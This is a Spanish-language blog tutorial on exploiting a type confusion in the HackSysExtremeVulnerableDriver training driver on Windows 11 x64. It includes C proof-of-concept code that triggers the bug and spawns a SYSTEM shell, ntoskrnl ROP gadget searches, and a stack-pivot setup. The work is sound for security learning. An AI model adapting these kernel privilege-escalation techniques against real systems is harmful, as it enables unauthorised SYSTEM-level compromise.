<!doctype html>
<html lang="en-us">
  <head>
    <title>0x06 - Acercándose a Windows Kernel Type Confusions Modernos // </title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.131.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
    

    
  


    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="0x06 - Acercándose a Windows Kernel Type Confusions Modernos">
  <meta name="twitter:description" content="En el último tutorial explotamos una “Type Confusion” dentro del kernel de Windows 7 (x86). Habiendo obtenido un base sólido para esta vulnerabilidad, podemos proceder a intentar aprovechalo dentro de Windows 11 (x64).
Table of Contents Ingeniería Inversa Escribiendo el Exploit Plan de Ataque El Comienzo de Sufrimiento Teoría Operaciones Generales de Memoria Memoria Virtual Sumario de Memoria Paginada Probando la Teoría Explotación Recursos Ingeniería Inversa Veamos el controlador vulnerable y las estructuras respectivas.">

    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x06-acerc%C3%A1ndose-a-windows-kernel-type-confusions-modernos/">
  <meta property="og:site_name" content="wetw0rk">
  <meta property="og:title" content="0x06 - Acercándose a Windows Kernel Type Confusions Modernos">
  <meta property="og:description" content="En el último tutorial explotamos una “Type Confusion” dentro del kernel de Windows 7 (x86). Habiendo obtenido un base sólido para esta vulnerabilidad, podemos proceder a intentar aprovechalo dentro de Windows 11 (x64).
Table of Contents Ingeniería Inversa Escribiendo el Exploit Plan de Ataque El Comienzo de Sufrimiento Teoría Operaciones Generales de Memoria Memoria Virtual Sumario de Memoria Paginada Probando la Teoría Explotación Recursos Ingeniería Inversa Veamos el controlador vulnerable y las estructuras respectivas.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-01-19T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-01-19T00:00:00+00:00">


  </head>
  <body>
    <header class="app-header">
      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
      <span class="app-header-title"></span>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
          </a>
        
          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">0x06 - Acercándose a Windows Kernel Type Confusions Modernos</h1>
      <div class="post-meta">
        <div>
          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
          Jan 19, 2025
        </div>
        <div>
          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
          15 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>En el <a href="https://wetw0rk.github.io/posts/0x05-introducci%C3%B3n-a-windows-kernel-type-confusion-vulnerabilidades/">último tutorial</a> explotamos una &ldquo;Type Confusion&rdquo; dentro del kernel de Windows 7 (x86). Habiendo obtenido un base sólido para esta vulnerabilidad, podemos proceder a intentar aprovechalo dentro de Windows 11 (x64).</p>
<h1 id="table-of-contents">Table of Contents</h1>
<ul>
<li><a href="#ingenier%C3%ADa-inversa">Ingeniería Inversa</a></li>
<li><a href="#escribiendo-el-exploit">Escribiendo el Exploit</a>
<ul>
<li><a href="#plan-de-ataque">Plan de Ataque</a></li>
<li><a href="#el-comienzo-de-sufrimiento">El Comienzo de Sufrimiento</a></li>
</ul>
</li>
<li><a href="#teor%C3%ADa">Teoría</a>
<ul>
<li><a href="#operaciones-generales-de-memoria">Operaciones Generales de Memoria</a></li>
<li><a href="#memoria-virtual">Memoria Virtual</a></li>
<li><a href="#sumario-de-memoria-paginada">Sumario de Memoria Paginada</a></li>
</ul>
</li>
<li><a href="#probando-la-teor%C3%ADa">Probando la Teoría</a></li>
<li><a href="#explotaci%C3%B3n">Explotación</a></li>
<li><a href="#recursos">Recursos</a></li>
</ul>
<h1 id="ingeniería-inversa">Ingeniería Inversa</h1>
<p>Veamos el controlador vulnerable y las estructuras respectivas.</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/decompiled_code.png" alt="alt text"></p>
<p>No podemos ignorar que tenemos mucha información sobre cómo funciona esta vulnerabilidad. La única diferencia que debemos tener en cuenta es la asignación de memoria, que será de 16 (0x10) bytes. Esto es por el tamaño de un &ldquo;unisigned long&rdquo; en la arquitectura de x64.</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/decompiled_code2.png" alt="alt text"></p>
<p>Dicho esto podemos empezar a escribir el PoC.</p>
<h1 id="escribiendo-el-exploit">Escribiendo el Exploit</h1>
<p>Abajo esta el PoC para empezar a trabajar.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define TYPE_CONFUSION 0x222023
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Type Confusion */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USER_TYPE_CONFUSION_OBJECT {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ObjectId;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ObjectType;
</span></span><span style="display:flex;"><span>} USER_TYPE_CONFUSION_OBJECT, <span style="color:#f92672">*</span>PUSER_TYPE_CONFUSION_OBJECT;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Type Confusion */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  LPVOID lpvNtKrnl <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  LPVOID lpvAllocation <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  lpvNtKrnl <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;ntoskrnl&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvNtKrnl <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of nt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Obtained the base address of nt: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvNtKrnl);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x1000</span>,
</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                               PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(lpvAllocation, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectId <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering Type Confusion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
</span></span><span style="display:flex;"><span>                  TYPE_CONFUSION,
</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>UserTypeConfusionObject,
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(UserTypeConfusionObject),
</span></span><span style="display:flex;"><span>                  NULL,
</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
</span></span><span style="display:flex;"><span>                  NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                      NULL,
</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                      NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Exploitation successful, enjoy the shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="plan-de-ataque">Plan de Ataque</h2>
<p>Una vez ejecutado, podemos ver que obtuvimos control sobre el flujo de ejecución.</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/crash.png" alt="alt text"></p>
<p>Podemos ver que el registro <strong>RBX</strong> apunta a nuestro objeto / estructura. Mi idea aquí es que podemos realizar un &ldquo;stack pivot&rdquo; en una asignación que controlamos desde el área de usuario (por ejemplo, VirtualAlloc).</p>
<h2 id="el-comienzo-de-sufrimiento">El Comienzo de Sufrimiento</h2>
<p>Busquemos gadgets, usaremos nuestra herramienta favorita <a href="https://github.com/0vercl0k/rp">rp++</a>, de <a href="https://github.com/0vercl0k">0vercl0k</a>.</p>
<pre tabindex="0"><code>C:\&gt;rp-win.exe --rop=20 --va=0 --file C:\Windows\System32\ntoskrnl.exe &gt; rop.txt
</code></pre><p>Dado que es un archivo grande, pasemos lo a Linux. Si planeas analizarlo usando grep, necesitarás convertir este archivo a ASCII.</p>
<pre tabindex="0"><code>$ file rop.txt
rop.txt: Unicode text, UTF-16, little-endian text, with very long lines (388), with CRLF line terminators

$ iconv -f utf-16 -t us-ascii//TRANSLIT rop.txt &gt; rop_ascii.txt      
</code></pre><p>En este momento estaba completamente confundido porque las cosas no iban como hemos planeado. Revisé el <a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-type-confusion/">blog de VulnDevs</a> para ver qué habría hecho y usó un &ldquo;gadget&rdquo; interesante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>QWORD STACK_PIVOT_GADGET <span style="color:#f92672">=</span> ntBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x317f70</span>; <span style="color:#75715e">// mov esp, 0x48000000; add esp, 0x28; ret; 
</span></span></span></code></pre></div><p>Nunca había visto un gadget como este ni siquiera sabía que esto fuera posible&hellip; hay algunas cosas que debemos tener en cuenta al usar un gadget como este.</p>
<ol>
<li>La dirección debe estar alineada (address % 16 == 0)</li>
<li>Debemos dar margen de maniobra para que el kernel lea / escriba en esta área de la memoria. (target_address - 0x1000)</li>
<li>Debemos encerrar la región de memoria usando VirtualLock</li>
</ol>
<p>El código abajo hace precisamente eso.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* We&#39;re going to be allocating memory at 0xF6C875C0-0x1000, we must do this to give
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     the kernel room to read/write to this memory region */</span>
</span></span><span style="display:flex;"><span>  lpvAllocTarget <span style="color:#f92672">=</span> (LPVOID)<span style="color:#ae81ff">0xF6C875C0</span>;
</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>((lpvAllocTarget <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x5000</span>,
</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                               PAGE_READWRITE);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* We lock the allocated memory region into RAM to avoid a page fault */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">VirtualLock</span>(lpvAllocation, <span style="color:#ae81ff">0x5000</span>) <span style="color:#f92672">==</span> FALSE)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to lock virtual address space</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Successfully locked 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvAllocation);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>((LPVOID)lpvAllocTarget, <span style="color:#ae81ff">0x4000</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvNtKrnl <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x32e4fe</span>; <span style="color:#75715e">// mov esp, 0xF6C875C0 ; ret
</span></span></span></code></pre></div><p>Una vez enviado, el pivote NO trabajó&hellip;</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/pivot.png" alt="alt text"></p>
<p>Si analizamos esto nos encontramos con una doble falta…</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/double_fault.png" alt="alt text"></p>
<p>A este punto pasó un mes y no llegaba a ninguna lugar&hellip; hasta que encontré un blog por <a href="https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f">wafzsucks</a> y finalmente todo se redujo a puntos de interrupción que rompían el exploit.</p>
<p>Una vez que eliminé mi punto de interrupción, todo funcionó?</p>
<h1 id="teoría">Teoría</h1>
<p>Aunque tenía un exploit funcional en este punto, quería entender por qué, así que decido recorrer el blog <strong>wafzsucks</strong> :)</p>
<p>Lo que sigue en esta sección son principalmente notas de <strong>wafzsucks</strong>. Quiero aser esto claro. Sin embargo, escribir notas es la forma en que yo aprendo.</p>
<h2 id="operaciones-generales-de-memoria">Operaciones Generales de Memoria</h2>
<p>Según la información de <a href="https://en.wikipedia.org/wiki/Kernel_(operating_system)">Wikipedia</a>, el kernel tiene acceso completo a la memoria del sistema. Es responsable de permitir que los procesos accedan a la memoria según sea necesario. Esto se hace mediante direccionamiento virtual (mediante paginación y/o segmentación).</p>
